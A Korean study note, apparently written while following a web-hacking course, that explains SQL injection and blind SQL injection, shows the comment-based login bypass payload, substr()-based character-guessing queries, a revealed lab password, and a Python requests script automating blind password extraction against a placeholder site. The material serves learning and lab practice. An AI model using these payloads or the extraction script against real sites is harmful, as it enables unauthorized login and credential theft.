## 들어가며
---
[[Background - Relational DBMS]]에서 DBMS에 대해 알아봤다. DBMS에서 관리하는 데이터베이스에는 회원의 계정, 비밀 게시물 등의 민감한 정보가 있을 수 있다. 공격자는 데이터베이스 파일 탈취, SQL Injection 공격 등으로 해당 경로를 확보하고 악용하여 금전적인 이득을 얻을 수 있다. 따라서 임의 정보 소유자 이외의 사용자에게 해당 정보가 노출되지 않도록 해야 한다.  

이번 강의에서는 DBMS에서 사용하는 쿼리를 임의로 조작해 데이터베이스의 정보를 획득하는 **SQL Injection** 기법에 대해 배운다. 

우리는 SQL Injection 기법을 배우기 전에 **Injection**이 무엇인지 알고 있어야 한다. Injection은 말 그대로 **주입**이라는 뜻으로, injection 공격은 사용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점으로, [[ClientSide - XSS|XSS]] 기법이나 [[ClientSide - CSRF|CSRF]] 기법과 비슷하다. 

아래 그림은 injection에 대한 이해를 돕기 위한 그림이다. 

![[Pasted image 20260206222256.png]]

이 그림처럼, DBMS에서 사용하는 질의 구문인 SQL을 삽입하는 공격을 SQL Injection이라 한다. 


## SQL Injection
---
SQL은 DBMS에 데이터를 질의하는 언어로, [[Building a Web Service]] 부분에서 다뤄 본 경험이 있을 것이다. 웹 서비스는 사용자의 입력을 SQL 구문에 포함해 요청하는 경우가 있다. 

예를 들어, 아래 쿼리는 로그인 할 때 애플리케이션이 DBMS에 질의하는 쿼리이다. 

```sql
SELECT * FROM accounts WHERE username='admin' AND password='qwer1234'
```

이 쿼리문을 보면, 사용자가 입력한 'admin'과 'qwer1234' 문자열을 SQL 구문에 포함하는 것을 확인할 수 있다. 이렇게 사용자가 SQL 구문에 임의의 문자열을 삽입하는 행위를 SQL Injection이라 하며, SQL Injection이 발생하면 조작된 쿼리로 인증을 우회하거나, 데이터베이스의 정보를 유출할 수 있다. 

아래 쿼리는 SQL Injection으로 조작된 쿼리문이다. 

```sql
SELECT * FROM accounts WHERE username='admin'
```

쿼리문을 보면 `password` 조건문이 사라진 것을 확인할 수 있는데, 이 쿼리를 통해 질의하면 DBMS는 ID가 admin인 계정의 비밀번호를 비교하지 않고 해당 계정의 정보를 반환하기 때문에 공격자는 admin 계정으로 로그인할 수 있다. 


### Blind SQL Injection
---
앞서 SQL Injection을 통해서 의도하지 않은 결과를 반환해 인증을 우회하는 것에 성공했다. 해당 공격은 인증 우회 이외에도 데이터베이스의 데이터를 알아낼 수 있는데, 이 때 사용하는 방식이 **Blind SQL Injection**이다. Blind SQL Injection은 스무고개 비슷한 원리로 동작해 데이터를 알아낸다. 

예를 들어, 이런 귀여운 춘식이 사진이 중요한 금고 안에 있다고 해 보자. 

![[Pasted image 20260206224703.png]]

춘식이의 정체를 모르는 공격자는 아래와 같이 DBMS가 답변이 가능한 형태로 질문하며 금고 안에 있는 춘식이를 알아낼 수 있다. 

Q1. 사진에 있는 그림이 식물인가요?
A1. 아닙니다.

Q2. 사진에 있는 그림이 고양이인가요?
A2. 맞습니다. 

Q3. 사진에 있는 그림이 검은색이 메인 컬러인가요?
A3. 아닙니다. 

Q4. 사진에 있는 그림이 대왕고굼과 관련이 있나요?
A4. 맞습니다.

이처럼 질의 결과를 사용자가 직접 확인하지 못할 때 참/거짓 반환 형태로 데이터를 획득하는 공격 기법을 Blind SQL Injection이라고 한다. 


### Blind SQL Injection 예시
---
아래는 Blind SQL Injection에 사용할 수 있는 쿼리이다. 

```sql
# 첫 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='a'-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='b'-- ' and upw=''; # True

# 두 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='d'-- ' and upw=''; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='e'-- ' and upw=''; # True 
```

쿼리를 살펴보면, 두 개의 조건이 있는 것을 확인할 수 있으며,`substr()` 함수에 대해 알면 이해가 쉬울 것이다.  

#### substr
---
해당 함수는 문자열에서 지정한 위치에서 길이까지의 값을 가져온다. 

```sql
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

여기서 공격 쿼리문의 두 번째 조건을 살펴보면, `upw`의 첫 번째 값을 아스키 형태로 변환한 값이 'a' 또는 'b'인지 질의한다. 질의 결과는 로그인 성공 여부로 판단할 수 있으며, 로그인이 성공하면 첫 번째 문자가 'a'임을, 아니라면 로그인이 실패한다. 

이처럼 쿼리문의 반환 결과를 통해 admin 계정의 비밀번호를 획득할 수 있다. 또한, `substr`  외에도 각 DBMS에서 제공하는 내장 함수를 잘 이용해 원하는 데이터를 추출할 수 있다. 


### SQL Injection 실습
---
지금까지 배운 내용을 [SQL Injection Lab](https://learn.dreamhack.io/labs/acbf4054-7b6d-4e7d-a562-f2374b5d5d01)을 통해 확인해 볼 수 있다. 

해당 Lab에서 사용했던 SQL Injection은 모듈의 Login 상자에서 **uid**에 `admin' --`을 입력해 뒤의 비밀번호 검증 부분을 주석처리하는 방식으로 공격을 수행해 로그인에 성공했다. 즉, SQL의 주석 구문인 `#`, `--`을 SQL Query에 넣어 `uid`만 일치해도 로그인할 수 있도록 한 것이다. 

또한, 해당 Lab에서 사용했던 Blind SQL Injection은 SQL Injection과 비슷하게 **uid**에만 쿼리를 입력하는데, 문제에서 `admin` 사용자의 비밀번호는 **영어 소문자 5글자 과일**이라 했기 때문에, 다음 쿼리를 입력해 가며 1글자씩 알아가면 된다. (~~사실, 2글자 정도 알면 AI 돌리면 된다~~)

```
admin' and substr(upw, 1, 1)='원하는 알파벳'--
```

참고로, 해당 Blind SQL Injection 문제에서 `admin`의 비밀번호는 `berry` 였다.


### Blind SQL Injection 공격 스크립트
---
Blind SQL Injection은 한 바이트 = 한 글자씩 비교하면서 공격하는 방식이기 때문에 다른 공격에 비해 많은 시간을 들여야 한다. 이런 귀찮음을 해결하기 위해 공격을 자동화하는 스크립트를 사용할 수 있다. 

공격 스크립트를 작성하기에 앞서 유용한 라이브러리를 알아보자. Python은 HTTP 통신을 위한 다양한 모듈이 존재하는데, 대표적으로 `requests` 모듈이 있다. 해당 모듈은 다양한 메서드를 사용해 HTTP 요청을 보낼 수 있으며, 응답 또한 확인할 수 있다. 

아래 코드는 `requests` 모듈을 통해 HTTP의 GET 메서드 통신을 하는 코드이다. 

```python
import requests

url = 'https://dreamhack.io/'
headers = {
	'Content-Type': 'application/x-www-form-urlencoded',
	'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
	'test': 1,
}

for i in range(1, 5):
	c = requests.get(url + str(i), headers=headers, params=params)
	print(c.request.url)
	print(c.text)
```

아래 코드는 HTTP의 POST 메서드 통신을 하는 코드이다. 

```python
import requests

url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
data = {
    'test': 1,
}

for i in range(1, 5):
    c = requests.post(url + str(i), headers=headers, data=data)
    print(c.text)
```

GET, POST 메서드 이외에도 다양한 메서드를 사용해 요청을 전송할 수 있으며, 자세한 기능은 **Requests 모듈 공식 문서**인 https://docs.python-requests.org/en/master/ 에서 확인할 수 있다.


### Blind SQL Injection 공격 스크립트 작성
---
HTTP GET request로 파라미터를 전달받는 홈페이지에 Blind SQL Injection을 시도한다고 생각해 보자. 공격하기에 앞서, 아스키 문자 범위 중 사용자가 입력 가능한 모든 문자의 범위를 지정해야 한다. 

비밀번호의 경우, 알파벳과 숫자 그리고 특수 문자의 조합으로 이뤄지며, 이는 아스키 범위의 출력 가능한 모든 문자로 Python에서의 `string` 모듈을 사용해 `string.printable`로 접근할 수 있다. 이를 고려해 작성한 스크립트는 다음과 같다.

```python
import requests
import string

url = 'http://example.com/login'
params = {
	'uid': '',
	'upw': ''
}

# ASCII 문자 중 사용 가능한 것들
tc = string.printable

# 사용할 SQL Injection 쿼리
query = '''admin' and substr(upw, {idx}, 1)='{val}'--'''
password = ''

# 비밀번호 길이는 20자 이하라고 가정
for idx in range(0, 20):
	for ch in tc:
		# 쿼리를 사용해 SQL Injection 시도
		params['uid'] = query.format(idx=idx+1, val=ch).strip('\n')
		c = requests.get(url, params=params)
		print(c.request.url)
		
		# 응답에 Login Success 문자열이 있다면 해당 문자를 password 변수에 저장
		if c.text.find('Login success') != -1:
			password += ch
			break
printf(f'Password is {password}')
```

코드를 살펴보면, 비밀번호에 포함될 수 있는 문자를 `string` 모듈을 써서 생성하고, 한 바이트씩 모든 문자를 진짜 비밀번호와 비교한다. 반복문 실행 중 반환 결과가 참일 경우 = 로그인이 될 경우 페이지에 표시되는 "Login success" 문자열을 찾고, 해당 결과값을 `password` 배열에 하나씩 저장하는 식으로 동작해 전체 비밀번호를 찾는다. 

다음은 해당 스크립트의 실행 결과이다. 

```shell
$ python3 bsqli.py
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%270%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%271%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%272%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%273%27--+&upw=
http://example.com/login?uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%274%27--+&upw=
```


## 마치며
---
이번 강의에서는 웹 해킹 하면 매우 많이 언급되는 SQL Injection과 이를 응용하는 Blind SQL Injection에 대해 알아봤다. 

Lab에서는 데이터를 조회하는 `SELECT` 명령어만을 사용했지만, `UPDATE`와 `DELETE`에서 SQL Injection이 발생하면 임의 데이터를 갱신하거나 삭제할 수 있다. 